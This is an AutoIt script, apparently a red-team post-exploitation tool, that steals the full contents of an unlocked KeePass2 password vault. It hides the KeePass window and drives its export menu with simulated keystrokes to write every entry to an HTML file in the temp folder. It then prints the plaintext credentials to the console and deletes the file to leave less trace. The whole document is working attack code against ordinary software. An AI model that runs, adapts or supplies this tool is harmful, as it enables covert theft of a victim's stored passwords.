#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Exports KeePass2 vault credentials to disk using UI automation & key presses.

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== KeePass2 credential export ===========" & @CRLF & @CRLF)

; KeePass window checks
_CheckKeePassWindow()
; If all checks pass, attempt to export creds to html file on disk
_ExportKeePassCreds()

Func _CheckKeePassWindow()

    ; Process check
    ConsoleWrite("----- Process Check -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking for KeePass process" & @CRLF & @CRLF)
    $keepassPID = ProcessExists("KeePass.exe")

    If Not $keepassPID = 0 Then
        ConsoleWrite("[i] KeePass.exe is running (PID: " & $keepassPID & ")" & @CRLF)
    ElseIf $keepassPID = 0 Then
        ConsoleWrite("[X] KeePass.exe is not running. Exiting." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Window checks
    ConsoleWrite(@CRLF & "----- Window Title Check -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Checking for loaded database and unlocked workspace" & @CRLF & @CRLF)

    ; Get KeePass window handle
    Global $keepassHandle = _GetHwndFromPID($keepassPID)

    ; Window active check
    If WinActive($keepassHandle) Then
        ConsoleWrite("[X] KeePass window is currently in the foreground. Try again later?" & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get KeePass Window title
    $keepassWindowTitle = WinGetTitle($keepassHandle)
    ConsoleWrite("[i] KeePass window title: " & $keepassWindowTitle & @CRLF & @CRLF)

    ; Check if credential database is loaded and workspace is unlocked
    If Not StringInStr($keepassWindowTitle, "kdbx") Then
        ConsoleWrite("[X] No database loaded or KeePass not open on main window. Exiting." & @CRLF & @CRLF)
        Exit
    ElseIf StringInStr($keepassWindowTitle, "Open Database") Or StringInStr($keepassWindowTitle, "locked") Then
        ConsoleWrite("[X] KeePass database not loaded or workspace is locked. Exiting." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc ;==>_CheckKeePassWindow

; Exports KeePass credentials to HTML file on disk
Func _ExportKeePassCreds()

    ConsoleWrite("----- Credential Export -----" & @CRLF & @CRLF)
    ConsoleWrite("[*] Attempting KeePass credential export" & @CRLF & @CRLF)

    ; Output file (current user's temp directory)
    $outputFile = @TempDir & "\keepass-export.html"

    ; Focus on KeePass window & hide it
    WinActivate($keepassHandle)
    WinSetState($keepassHandle, "", @SW_HIDE)

    ; Open export menu using keyboard shortcuts
    Send("{ALT}")
    Send("{ENTER}")
    Send("E")

    ; Interaction with export menu
    WinWaitActive("Export File/Data")
    Send("{TAB 2}")
    Send("{DOWN 5}")
    Send("{TAB}")
    Send($outputFile)
    Send("{ENTER}")

    ; Confirm export
    WinWaitActive("Export To HTML")
    Send("{ENTER}")

    ; Print output file location
    ConsoleWrite("[i] KeePass2 export file written to: " & $outputFile & @CRLF & @CRLF)

    ; Read export file
    ConsoleWrite("[*] Reading output file" & @CRLF & @CRLF)
    Sleep(2000)
    If FileExists($outputFile) Then
        Local $sfileRead = FileRead($outputFile)
        ConsoleWrite("[+] Output file contents:" & @CRLF & @CRLF & $sfileRead)
    EndIf

    ; Delete export file
    ConsoleWrite(@CRLF & @CRLF & "[*] Deleting output file" & @CRLF & @CRLF)
    FileDelete($outputFile)
    ConsoleWrite("[i] Export file at '" & $outputFile & "' has been deleted" & @CRLF & @CRLF)

    ConsoleWrite("[*] Done" & @CRLF & @CRLF)

EndFunc ;==>_ExportKeePassCreds

#cs ----------------------------------------------------------------------------

Util functions:
    _GetHwndFromPID()

#ce ----------------------------------------------------------------------------

; Gets window handle from PID
; Adapted from - https://www.autoitscript.com/wiki/FAQ#How_can_I_get_a_window_handle_when_all_I_have_is_a_PID.3F
Func _GetHwndFromPID($PID)

    $hWnd = 0
    $stPID = DllStructCreate("int")
    Do
        $winlist2 = WinList()
        For $i = 1 To $winlist2[0][0]
            If $winlist2[$i][0] <> "" Then
                DllCall("user32.dll", "int", "GetWindowThreadProcessId", "hwnd", $winlist2[$i][1], "ptr", DllStructGetPtr($stPID))
                If DllStructGetData($stPID, 1) = $PID Then
                    $hWnd = $winlist2[$i][1]
                    ExitLoop
                EndIf
            EndIf
        Next
        Sleep(100)
    Until $hWnd <> 0
    Return $hWnd

EndFunc ;==>_GetHwndFromPID
